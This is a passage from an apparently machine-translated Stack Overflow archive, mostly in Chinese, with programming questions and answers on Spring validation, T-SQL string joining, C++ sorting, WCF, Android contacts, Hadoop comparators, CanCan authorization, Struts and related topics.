at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:617)
at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:578)
at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:80)
at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:923)
at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:852)
at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:882)
at org.springframework.web.servlet.FrameworkServlet.doPost(FrameworkServlet.java:789)
at javax.servlet.http.HttpServlet.service(HttpServlet.java:641)
at javax.servlet.http.HttpServlet.service(HttpServlet.java:722)
at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:305)
at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)
at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:343)
at org.springframework.security.web.access.intercept.FilterSecurityInterceptor.invoke(FilterSecurityInterceptor.java:109)
at org.springframework.security.web.access.intercept.FilterSecurityInterceptor.doFilter(FilterSecurityInterceptor.java:83)
at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:355)
at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:97)
at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:355)
at org.springframework.security.web.session.SessionManagementFilter.doFilter(SessionManagementFilter.java:100)
at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:355)
at org.springframework.security.web.authentication.AnonymousAuthenticationFilter.doFilter(AnonymousAuthenticationFilter.java:78)
at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:355)
at org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter.doFilter(SecurityContextHolderAwareRequestFilter.java:54)
at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:355)
at org.springframework.security.web.savedrequest.RequestCacheAwareFilter.doFilter(RequestCacheAwareFilter.java:35)
at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:355)
at org.springframework.security.web.authentication.AbstractAuthenticationProcessingFilter.doFilter(AbstractAuthenticationProcessingFilter.java:188)
at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:355)
at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:105)
at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:355)
at org.springframework.security.web.context.SecurityContextPersistenceFilter.doFilter(SecurityContextPersistenceFilter.java:79)
at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:355)
at org.springframework.security.web.session.ConcurrentSessionFilter.doFilter(ConcurrentSessionFilter.java:109)
at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:355)
at org.springframework.security.web.FilterChainProxy.doFilter(FilterChainProxy.java:149)
at org.springframework.web.filter.DelegatingFilterProxy.invokeDelegate(DelegatingFilterProxy.java:346)
at org.springframework.web.filter.DelegatingFilterProxy.doFilter(DelegatingFilterProxy.java:259)
at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:243)
at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)
at org.springframework.web.filter.HiddenHttpMethodFilter.doFilterInternal(HiddenHttpMethodFilter.java:77)
at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:76)
at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:243)
at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)
at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:222)
at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:123)
at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:472)
at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:168)
at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:99)
at org.apache.catalina.valves.AccessLogValve.invoke(AccessLogValve.java:929)
at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:118)
at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:407)
at org.apache.coyote.http11.AbstractHttp11Processor.process(AbstractHttp11Processor.java:1002)
at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:585)
at org.apache.tomcat.util.net.JIoEndpoint$SocketProcessor.run(JIoEndpoint.java:310)
at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1146)
at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
at java.lang.Thread.run(Thread.java:679) 
```

我还使用了注释：

```
@NumberFormat(style=Style.NUMBER)
@Pattern(regexp="[0-9].[0-9]")
private BigDecimal totalAreaInAcres; 
```

但没有运气，它会抛出同样的错误。谁能让我知道如何验证以避免输入字段中出现字符或在输入字符时显示错误消息。

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-24T07:46:47.860

第 40 行的 AddLayoutValidator 中的某些内容为空。我不知道它是什么，但我从您的代码中看到，您尝试`area` *在它被验证之前*使用的值。由于它是 BigDecimal，如果您没有发布数字，它只能为空。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-01-17T18:49:16.793

您使用了“@NumberFormat(style=Style.NUMBER)”注解，当您输入除数字以外的任何字符时，该注解会引发异常。

# sql-server - T-SQL concatenate VarChar with comma

> ID：16184724
> 
> 赞同：2
> 
> 时间：2013-04-24T06:20:21.077
> 
> 标签：sql-server, tsql, concatenation

I'm new to SQL. I have this working SQL function, but I would like to join the results with a comma in a way that leaves no extraneous commas if the result is empty. I had a play with COALESCE but I couldn't get it to work. Any clues or help would be great.

In Python I would do this:

```
'abcdef'.join(', ') 
```

Here is the SQL function now:

```
USE [Broadcast]
GO
/****** Object:  UserDefinedFunction [dbo].[MapConsumerAdvice]    Script Date: 04/24/2013 14:49:10 ******/
SET ANSI_NULLS ON
GO
SET QUOTED_IDENTIFIER ON
GO
-- =============================================
-- Author:      <Author,,Name>
-- Create date: <Create Date, ,>
-- Description: <Description, ,>
-- =============================================
ALTER FUNCTION [dbo].[MapConsumerAdvice] 
(
    @A as Int,
    @B as Int,
    @C as Int,
    @D as Int,
    @E as Int,
    @F as Int,
    @G as Int,
    @H as Int
)
RETURNS VarChar(20)
AS
BEGIN

    DECLARE @Result as VarChar(999)

    SET @Result = ''

    IF (@A > 0) SET @Result = @Result + ',' + 'a'
    IF (@B > 0) SET @Result = @Result + ',' + 'd'
    IF (@C > 0) SET @Result = @Result + ',' + 'h'
    IF (@D > 0) SET @Result = @Result + ',' + 'l'
    IF (@E > 0) SET @Result = @Result + ',' + 'm'
    IF (@F > 0) SET @Result = @Result + ',' + 'n'
    IF (@G > 0) SET @Result = @Result + ',' + 's'
    IF (@H > 0) SET @Result = @Result + ',' + 'v'

    Return @Result

END 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-24T06:33:51.070

尝试

```
RETURN SUBSTRING(@Result, 2, LEN(@Result)) 
```

或者

```
RETURN RIGHT(@Result, LEN(@Result)-1) 
```

代替`Return @Result`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-24T06:38:43.230

您确实需要检查是否分配了任何内容。

```
USE [Broadcast]
GO
/****** Object:  UserDefinedFunction [dbo].[MapConsumerAdvice]    Script Date: 04/24/2013 14:49:10 ******/
SET ANSI_NULLS ON
GO
SET QUOTED_IDENTIFIER ON
GO
-- =============================================
-- Author:      <Author,,Name>
-- Create date: <Create Date, ,>
-- Description: <Description, ,>
-- =============================================
ALTER FUNCTION [dbo].[MapConsumerAdvice] 
(
    @A as Int,
    @B as Int,
    @C as Int,
    @D as Int,
    @E as Int,
    @F as Int,
    @G as Int,
    @H as Int
)
RETURNS VarChar(20)
AS
BEGIN

DECLARE @Result as VarChar(999)

SET @Result = ''

IF (@A > 0) SET @Result = @Result + ',' + 'a'
IF (@B > 0) SET @Result = @Result + ',' + 'd'
IF (@C > 0) SET @Result = @Result + ',' + 'h'
IF (@D > 0) SET @Result = @Result + ',' + 'l'
IF (@E > 0) SET @Result = @Result + ',' + 'm'
IF (@F > 0) SET @Result = @Result + ',' + 'n'
IF (@G > 0) SET @Result = @Result + ',' + 's'
IF (@H > 0) SET @Result = @Result + ',' + 'v'

IF PATINDEX(',%', @Result) > 1 Set @Result = SUBSTRING(@Result, 2, LEN(@Result));

Return @Result

END 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-24T06:25:58.770

在函数末尾添加以下代码，

```
RETURN REPLACE(@result,',,',',') 
```

# c++ - 尝试将 std::sort() 与自定义对象一起使用

> ID：16184728
> 
> 赞同：0
> 
> 时间：2013-04-24T06:20:36.363
> 
> 标签：c++, sorting, object, vector

我在网上查了一些教程。我已经在我的身上尝试过，但问题是`std::sort()`没有执行任何操作！这是我的整个代码：

```
#include <string>
#include <iostream>
#include <iomanip>
#include <sstream> 
#include <algorithm>
#include <vector>
using namespace std;

#ifndef _card_h
#define _card_h

enum Suit {
    CLUBS, DIAMONDS, HEARTS, SPADES
};

enum Rank {
    TWO, THREE, FOUR, FIVE, SIX, SEVEN, EIGHT, NINE, TEN, JACK, QUEEN, KING, ACE
};

class Card {
    public:
        Card();
        Card(Rank, Suit);
        ~Card();
        Rank GetRank();
        Suit GetSuit();
        string ToString();
    private:
        Rank rank;
        Suit suit;
};
#endif

Card::Card() {
}

Card::Card(Rank rank, Suit suit) {
    this->rank = rank;
    this->suit = suit;
}

Card::~Card() {}

Rank Card::GetRank() {
    return rank;
}

Suit Card::GetSuit() {
    return suit;
}

string Card::ToString() {
    string cardName = "";
    switch (rank) {
        case TWO   : cardName += "2"; break;
        case THREE : cardName += "3"; break;
        case FOUR  : cardName += "4"; break;
        case FIVE  : cardName += "5"; break;
        case SIX   : cardName += "6"; break;
        case SEVEN : cardName += "7"; break;
        case EIGHT : cardName += "8"; break;
        case NINE  : cardName += "9"; break;
        case TEN   : cardName += "T"; break;
        case JACK  : cardName += "J"; break;
        case QUEEN : cardName += "Q"; break;
        case KING  : cardName += "K"; break;
        case ACE   : cardName += "A"; break;
    }
    switch (suit) {
        case CLUBS    : cardName += "C"; break;
        case DIAMONDS : cardName += "D"; break;
        case HEARTS   : cardName += "H"; break;
        case SPADES   : cardName += "S"; break;
    }
    return cardName;
}

#ifndef _cardcomparer_h
#define _cardcomparer_h

class CardComparer {  
    public:
        bool operator() (Card*, Card*);
    private:
        Card* firstCard;
        Card* secondCard;
};
#endif

bool CardComparer::operator() (Card* firstCard, Card* secondCard) {
    this->firstCard = firstCard;
    this->secondCard = secondCard;
    cout << "in Cardcompare! " << endl;
    if (firstCard->GetRank() == secondCard->GetRank()) {
        return firstCard->GetSuit() > secondCard->GetSuit();
    }
    else {
        return firstCard->GetRank() > secondCard->GetRank();
    }
}

#ifndef _hand_h
#define _hand_h
const int CARDS_IN_HAND = 5;
class Hand {
    public:
        Hand(int);
        ~Hand();
        void AddCard(Card*);
        string ToString();

    private:
        int cardCount;
        int playerID;
        vector<Card*> cards;

};
#endif

Hand::Hand(int playerID) {
    this->playerID = playerID;
    cards.reserve(CARDS_IN_HAND);
    cardCount = 0;
}

Hand::~Hand() {
    cards.clear();
}

void Hand::AddCard(Card* newCard) {
    cards[cardCount] = newCard;
    cardCount++;
    sort(cards.begin(), cards.end(),CardComparer());
}

string Hand::ToString() {
    stringstream playerCards;
    playerCards << "Player " << this->playerID << " -";
    for (int i = 0; i < cardCount; i++ ){
        playerCards << " " << cards[i]->ToString();
    }
    return playerCards.str();
}

int main() {
    vector<Hand*> hands;
    hands.reserve(1);
    hands[0] = new Hand(0);
    hands[0]->AddCard(new Card((Rank)4, (Suit)1));
    hands[0]->AddCard(new Card((Rank)8, (Suit)2));
    hands[0]->AddCard(new Card((Rank)5, (Suit)1));
    hands[0]->AddCard(new Card((Rank)2, (Suit)0));
    hands[0]->AddCard(new Card((Rank)7, (Suit)3));
    cout << hands[0]->ToString() << endl;
    return 0;
} 
```

问题是第 133( `sort(cards.begin(), cards.end(),CardComparer());`) 行没有执行。无论我将其注释掉还是在结果中都没有改变，我什至在 93( `cout << "in Cardcompare! " << endl;`) 上添加了一个额外的行，如果它使用 bool，它会在其中打印出一些东西。然而事实并非如此。我找不到问题出在哪里。这里有什么问题，我该如何解决？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-24T06:27:01.743

问题是向量不知道您尝试将卡片添加到 中`AddCard`，或者更准确地说，您并没有*真正*添加这些卡片，因为您没有调用`push_back`，而只是将指针放在内存中的某个位置。是的，由于对 的调用，向量拥有该内存`reserve`，但它认为它是空的。因此`begin()`，并`end()`给出相同的迭代器和排序正好对 0 个元素进行排序。

`vector`在您选择的教科书中查找关于和其他容器的章节。您不需要跟踪卡片的数量 ( `cardCount`)，因为如果使用得当，向量会为您完美地完成这项工作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-24T06:52:56.483

您的代码有许多问题需要解决。最重要的一个事实是您当前正在泄漏大量内存。您正在声明`vector<Card*>`和分配内存，但从不释放它。此外，您将数据输入向量的方式也不正确。保留函数实际上并不创建新元素，它只是为它们保留内存。

这是一个清理版本，包括让您的排序正常工作。希望通过学习它，你会学到一些关于 C++ 的东西。

```
#include <string>
#include <iostream>
#include <iomanip>
#include <sstream> 
#include <algorithm>
#include <vector>
#include <memory>
using namespace std;

enum Suit {
    CLUBS, DIAMONDS, HEARTS, SPADES
};

enum Rank {
    TWO, THREE, FOUR, FIVE, SIX, SEVEN, EIGHT, NINE, TEN, JACK, QUEEN, KING, ACE
};
const char *card_lookup[] = {"2", "3", "4", "5", "6", "7", "8", "9", "T", "J", "Q", "K", "A"};
const char *suit_lookup[] = {"C", "D", "H", "S" };

class Card {
    public:
        Card::Card() 
        { }
        Card::Card(Rank rank, Suit suit) 
        {
            this->rank = rank;
            this->suit = suit;
        }
        Card::~Card() 
        {}
        Rank Card::GetRank() const
        {
            return rank;
        }

        Suit Card::GetSuit() const
        {
            return suit;
        }
        string Card::ToString() {
            string cardName = card_lookup[rank];
            cardName += suit_lookup[suit];
            return cardName;
        }
    private:
        Rank rank;
        Suit suit;
};

bool operator<(const Card& lhs, const Card& rhs)
{
    if(lhs.GetRank() == rhs.GetRank())
        return lhs.GetSuit() < rhs.GetSuit();
    else
        return lhs.GetRank() < rhs.GetRank();

}

const int CARDS_IN_HAND = 5;
class Hand {
    public:
        Hand::Hand(int playerID) 
        {
            this->playerID = playerID;
        }
        Hand::~Hand() 
        { }

        void Hand::AddCard(Card newCard) 
        {
            cards.push_back(newCard);
        }
        string Hand::ToString() 
        {
            sort(cards.begin(), cards.end());

            stringstream playerCards;
            playerCards << "Player " << this->playerID << " -";
            for (auto it = cards.begin(), end = cards.end(); it != end; ++it)
                playerCards << " " << it->ToString();

            return playerCards.str();
        }

    private:
        int playerID;
        vector<Card> cards;

};

int main() {
    vector<Hand> hands;
    Hand h(1);
    h.AddCard(Card(SIX, DIAMONDS));
    h.AddCard(Card(TEN, HEARTS));
    h.AddCard(Card(SEVEN, DIAMONDS));
    h.AddCard(Card(FOUR, CLUBS));
    h.AddCard(Card(NINE, SPADES));
    hands.push_back(h);
    cout << hands[0].ToString() << endl;
    return 0;
} 
```

# wcf - WCF 绑定过滤器选项

> ID：16184729
> 
> 赞同：0
> 
> 时间：2013-04-24T06:20:39.857
> 
> 标签：wcf, wcf-binding, servicecontract, operationcontract

是否有可能我们可以将`(OperationContract)`一个合同的少数方法暴露`ServiceContract)`给一个绑定，而将同一合同的`WCF`其余方法暴露给另一个绑定？`(OperationContract)``(ServiceContract)`

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-24T13:18:17.930

不可以。当您托管服务时，您可以在服务配置中为服务操作自由定义一个或多个端点。但是，这些操作中的每一个都将在所有定义的端点上公开。（例外情况是某些传输绑定不支持某些类型的操作）。

听起来好像您应该将运营合同拆分为单独的服务合同，然后托管两个服务。

# android - android：读取 gmail 联系人的全尺寸照片

> ID：16184737
> 
> 赞同：2
> 
> 时间：2013-04-24T06:21:21.247
> 
> 标签：android, photo, contact

我试图在 Imageview 上阅读并显示联系人的全尺寸照片。下面的代码在本地创建联系人的模拟器中运行良好。

在从 gmail 同步联系人的 Attrix 4G 上进行测试时，它没有显示完整大小的联系人。

```
 Uri contactUri = ContentUris.withAppendedId(
            ContactsContract.Contacts.CONTENT_URI, id);
    Uri displayPhotoUri = Uri.withAppendedPath(contactUri,
            ContactsContract.Contacts.Photo.DISPLAY_PHOTO);

    AssetFileDescriptor fd = cr.openAssetFileDescriptor(
                displayPhotoUri, "r");
        input = fd.createInputStream();
return BitmapFactory.decodeStream(input); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-08-19T21:03:00.410

上面的代码在 Nexus 4 上如何为我工作。

```
 ContentResolver cr = getContext().getContentResolver();
    PersonUri = ContentUris.withAppendedId(ContactsContract.Contacts.CONTENT_URI, 3347);
    Uri displayPhotoUri = Uri.withAppendedPath(PersonUri, ContactsContract.Contacts.Photo.DISPLAY_PHOTO);
     try {
        AssetFileDescriptor fd = cr.openAssetFileDescriptor(displayPhotoUri, "r");
        input = fd.createInputStream();
    } catch (Exception e) {
        // TODO Auto-generated catch block
        e.printStackTrace();
    }
    //InputStream input = ContactsContract.Contacts.openContactPhotoInputStream(cr, PersonUri);

    if(input != null){
        showImage(mPhoto, BitmapFactory.decodeStream(input));
    }else{
        showImage(mPhoto, R.drawable.jb_picture_unknown);
    } 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-06-30T23:11:08.877

根据我的阅读，问题仅仅是因为 Gmail 没有同步照片的高分辨率版本，特别是对于旧设备/API 级别。

因此，虽然如果照片可用，您的代码将起作用，但对 openAssetFileDescriptor 的调用将失败，因为没有相应的高分辨率文件。

请参阅针对 Android 报告的此[问题（不正确？）。](http://code.google.com/p/android/issues/detail?id=3870&q=contact%20photo&sort=-stars&colspec=ID%20Type%20Status%20Owner%20Summary%20Stars)

# iphone - 有什么方法可以将 Appboy SDK 新闻页面的主标题从“新闻和警报”更改为其他内容？

> ID：16184740
> 
> 赞同：0
> 
> 时间：2013-04-24T06:21:36.267
> 
> 标签：iphone, xcode4.5, iphone-5, ios6.1

我目前在我的应用程序中使用 appboy SDK。我们可以使用“displayNews”方法显示新闻和警报页面。在这个页面中，它显示了一个名为“新闻和警报”的标题。但我想替换这个标题根据我的客户要求，“新闻和警报”还有其他内容。有什么办法吗？？？请回答我的问题。

谢谢，普拉卡什

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-24T21:45:36.217

标记 Appboy 的 CEO。也可以直接给我发电子邮件，mark@appboy.com

您不能只更改文本，但可以添加您指定的自定义图像。当前 SDK 中有一些附加选项，您可以在 AppboySession.h 中访问它们，您将看到一个主题对象，您可以在其中设置一些附加属性。以下每个字段配置的文档位于 AppboySession.h 中。

```
[AppboySession theming].sectionHeaderBackgroundImageName = @"table-section-header.png";

[AppboySession theming].navBackButtonImageName = @"navbar-back-btn.png";
[AppboySession theming].navBackButtonHighlightedImageName = @"navbar-back-btn-pressed.png";
[AppboySession theming].navBackgroundImageName = @"navbar-bg-opaque.png";
[AppboySession theming].navBarButtonBackgroundImageName = @"navbar-bar-btn-item.png";
[AppboySession theming].navTitleImageName = @"appboy_title_image.png";
[AppboySession theming].customBodyFont = @"Roboto-Light";
[AppboySession theming].customTitleFont = @"Roboto-Regular";
[AppboySession theming].customHeaderFont = @"Roboto-Condensed";
[AppboySession theming].customImageCornerRadius = 0.0;
[AppboySession theming].customButtonCornerRadius = 0.0;
AppboySession theming].shouldResizeNavigationBarInLandscape = NO; 
```

# mysql - mysql innodb ibd 文件空间使用情况

> ID：16184741
> 
> 赞同：0
> 
> 时间：2013-04-24T06:21:44.280
> 
> 标签：mysql, innodb, space

我有一个 innodb 表，并在主机 A 上设置 mysql innodb_file_per_table=1

此表的 ibd 文件分配大约 3GB 磁盘

然后，我将此表转储到 sql 文件（a.sql），a.sql 分配大约 2.5Gb 磁盘

接下来，我将 a.sql 导入到主机 B。

主机 A 和主机 B 具有相同的硬件、相同的系统、相同的 mysql 配置。

但是我发现，主机B上的这个表的ibd文件分配了30GB的磁盘。

我尝试将主机 B 上的此表转储到 b.sql

b.sql 的大小与 a.sql 相同。

我确信在将 a.sql 导入主机 B 后，我们没有警报表操作。

为什么分配磁盘这么大？谢谢。

表说明：

![在此处输入图像描述](https://i.stack.imgur.com/CI6nS.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-10-08T02:06:34.427

你那里还有 ibdata1 吗？在主机 A 上运行优化表 a 后的结果是什么？这可能是因为在主机 A 中，您的表 A 的一些数据在文件 ibdata1 中。

# javascript - How to make filterFilter return an array of indexes instead of items?

> ID：16184744
> 
> 赞同：0
> 
> 时间：2013-04-24T06:21:58.013
> 
> 标签：javascript, angularjs, angularjs-service

I want to use filterFilter functionality but I want to reuse the arrays of data instead of creating a new array everytime it runs. So returning an array of indexes and then I can, inside my service, return the items associated to the indexes. This way I can create a $watch export on my service, so I can watch on the real items instead of the filters.

I considered copying the angular filterFilter source, but that isn't maintainable in the long run, what could I do?

Context:

I'm writing a form wizard service that applies a schema to the steps (there are many with slightly different object structures each step), that holds an array of objects. filterFilter returns a new array of objects, so when I modify the object inside the service using a "setter", it's not updating the object itself, but a new (?) created object, and that's no use for me

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-24T07:16:29.887

Javascript 有 Object.keys(arrayName) 可以做到这一点，但您必须为 IE8 或更低版本添加一个 poly-fill。

```
var a = ['foo', 'bar'];
Object.keys( a ); //returns ['0','1']; 
```

如果您想在旧版浏览器中使用它，**[MDN Object.keys 文章](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/Object/keys)**有一篇实现文章。

但是，在查看您的问题时，我认为您误读了[过滤](http://docs.angularjs.org/api/ng.filter%3afilter)器过滤器。当您使用此过滤器时，它可能会返回与输入不同的数组，但是该过滤器中的每个对象仍然是对原始对象的引用。因此，编辑任何对象都应该毫无问题地修改原始对象。

希望这可以帮助。

# hadoop - Hadoop中的Sort Comparator和Group Comparator有什么区别？

> ID：16184745
> 
> 赞同：15
> 
> 时间：2013-04-24T06:22:00.190
> 
> 标签：hadoop, bigdata

Hadoop中的**Sort Comparator**和**Group Comparator**有什么区别？

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2013-04-24T07:30:54.363

要了解**GroupComparator**，请参阅我对这个问题的回答 -

[hadoop map reduce中分组比较器有什么用](https://stackoverflow.com/questions/14728480/what-is-the-use-of-grouping-comparator-in-hadoop-map-reduce)

**SortComparator**：用于定义 map 输出键如何排序

Hadoop - 权威指南一书的摘录：

键的排序顺序如下：

1.  如果该属性`mapred.output.key.comparator.class`已设置，无论是显式设置还是通过调用`setSortComparatorClass()`Job，都将使用该类的实例。（在旧 API 中，等效方法是`setOutputKeyComparatorClass()`on `JobConf`。）

2.  否则，键必须是 的子类`WritableComparable`，并且使用键类的注册比较器。

3.  如果没有注册的比较器，则`RawComparator`使用 a 将被比较的字节流反序列化为对象并委托给`WritableComparable`'s`compareTo()`方法。

**SortComparator 与 GroupComparator 合二为一：** `SortComparator`决定 map 输出键的排序方式，同时`GroupComparator`决定 Reducer 中的哪些 map 输出键转到同一个 reduce 方法调用。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2015-09-14T00:21:45.480

**Group Comparator**决定将哪些映射输出键**合并（分组）为一个键，**当然所有值的集合也将被分组。通常它需要第一个键作为摘要收集的唯一键。

**SortComparator决定如何在****reduce 的输入中对**键进行排序。默认情况下，它使用自然排序。

# ruby-on-rails - 授权嵌套和多态资源 (cancan)

> ID：16184746
> 
> 赞同：0
> 
> 时间：2013-04-24T06:22:00.957
> 
> 标签：ruby-on-rails, ruby-on-rails-3, ruby-on-rails-3.1, ruby-on-rails-3.2, cancan

拥有模型用户、项目、文档、问题、评论、能力：

```
class User < ActiveRecord::Base
  has_and_belongs_to_many :projects
end

class Project < ActiveRecord::Base
  has_and_belongs_to_many :users
  has_many :documents
end

class Issues < ActiveRecord::Base
  belongs_to :project
  has_many :comments, :as => :commentable
end

class Document < ActiveRecord::Base
  belongs_to :project
  has_many :comments, :as => :commentable
end

class Comment < ActiveRecord::Base
  belongs_to :commentable, :polymorphic => true
end

class Ability
  include CanCan::Ability

  def initialize(user)
    user ||= User.current

    can :read, Project, :id => user.project_ids
    can :manage, Document, :project => { :id => user.project_ids }
  end
end 
```

路线：

```
resources :projects, :shallow => true, :path => '/', :only => :show do
  resources :documents do
    resources :comments
  end
  resources :issues do
    resources :comments
  end
end 
```

控制器：

```
class DocumentsController < InheritedResources::Base
  load_and_authorize_resource :project
  load_and_authorize_resource :document, :through => :project, :shallow => true

  # GET /1/documents
  # GET /1/documents.json
  def index
    @project = Project.find(params[:project_id])
    @documents = @project.documents.page(params[:page])

    respond_to do |format|
      format.html
      format.json { render :json => @documents }
    end
  end

  # POST /1/documents/new
  # POST /1/documents/new.json
  def new
    @project = Project.find(params[:project_id])
    @document = @project.documents.build

    respond_to do |format|
      format.html
      format.json { render :json => @document }
    end
  end

  # POST /1/documents
  # POST /1/documents.json
  def create
    @project = Project.find(params[:project_id])
    @document = @project.documents.build(params[:document])

    respond_to do |format|
      if @document.save
        format.html { redirect_to @document, notice: 'Document was successfully created.' }
        format.json { render json: @document, status: :created, location: @document }
      else
        format.html { render action: "new" }
        format.json { render json: @document.errors, status: :unprocessable_entity }
      end
    end
  end
end 
```

项目能力还可以，但是创建文档失败。问题：

1.  我对文档能力做错了什么？
2.  如何编写注释功能（多态和嵌套）？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-24T09:38:12.130

InheritedResources 需要添加belongs_to 参数：

```
belongs_to :project, :optional => true 
```

查找更多 @ [https://github.com/ryanb/cancan/wiki/Inherited-Resources](https://github.com/ryanb/cancan/wiki/Inherited-Resources)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-24T08:58:38.843

用于创建文档

在能力类中添加“can :create, Document”，因为当时创建操作被称为“项目”对于该文档是 nil。

评论写作能力：

你能解释一下你想要达到的目标吗？如果您想让用户阅读其他用户的评论，那么

在用户模型中添加一些关系：

has_many :documents, :through => :projects

has_many :comments, :through => :documents

然后在你的能力类中添加

可以：阅读，评论，：commentable_id => user.comment_ids

# java - 使用相同的 struts html:optionsCollection 进行差异下拉

> ID：16184747
> 
> 赞同：0
> 
> 时间：2013-04-24T06:22:04.443
> 
> 标签：java, struts

我正在使用`struts 1.1`，我有两个具有相同数据的下拉列表（下拉列表）。我必须将选定的两个值作为 varchars 保存在两个不同的列中。
我可以使用在表单中为两个下拉菜单创建的相同地图来完成此操作吗？

例如，下面是一个保存用户 ID 的下拉菜单，假设还有另一个类似的下拉菜单，我保存创建用户 ID，它们都使用相同的填充用户列表。

```
<html:select property="selectedCancelUserId">
     <html:option value="">-</html:option>
     <html:optionsCollection property="usedByUserList" label="name" value="staffNo"/>
</html:select> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-24T06:38:15.227

您需要有两个不同的表单变量，例如`selectedCancelUserId`和`selectedCreateUserId`在表单中以捕获来自用户的两个不同输入。`usedByUserList`只要您将表单值与它们关联，就可以在表单中多次使用它们进行显示。

```
 <html:select property="selectedCancelUserId">
       <html:option value="">-</html:option>
       <html:optionsCollection property="usedByUserList" label="name" value="staffNo"/>
 </html:select>

 <html:select property="selectedCreateUserId">
       <html:option value="">-</html:option>
       <html:optionsCollection property="usedByUserList" label="name" value="staffNo"/>
 </html:select> 
```

# android - Change Text Color of a Specific Character

> ID：16184748
> 
> 赞同：0
> 
> 时间：2013-04-24T06:22:04.877
> 
> 标签：android, textview, spannablestring

Currently I m using TextView. I need to change the color of specific character in a string , as i have to work with **localization** so **SpannableString** won`t help me that much.

The string may be like this ***Hello please select at least 1 to move on*** now i would to change the text of just this specific "1" so that if it is converted to other language like french dutch the color of "1" wont get disturb with respect to its indexing.

How can i achieve this

P.S String is coming from `R.String`

Thank you

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-24T06:48:07.713

如果您的特定字符在不同语言中始终相同，则可以使用`String.indexOf(String string)`来获取字符的位置，而不是使用`Spannable`来格式化字符串。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-24T06:48:44.557

看看这个：

```
myMsg.setText("Hello please select at least" +  Html.fromHtml("<font color='#FF0000'><b>1</b></font>"+"to move on")) 
```

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2013-04-24T06:52:05.547

你必须使用 ForegroundColorSpan，[http://developer.android.com/reference/android/text/style/ForegroundColorSpan.html](http://developer.android.com/reference/android/text/style/ForegroundColorSpan.html)

# python - 对 CSV 文件进行排序 Python/Linux 命令

> ID：16184750
> 
> 赞同：1
> 
> 时间：2013-04-24T06:22:15.657
> 
> 标签：python, linux

我需要按包含以下格式的 Temp5 列对 CSV 文件进行排序。在我的具体情况下，Temp5 列包含失败的值。
换句话说，它不包含任何值，只显示失败。

因此，我需要对 Temp5 中的值执行排序操作并忽略 Failed 值。

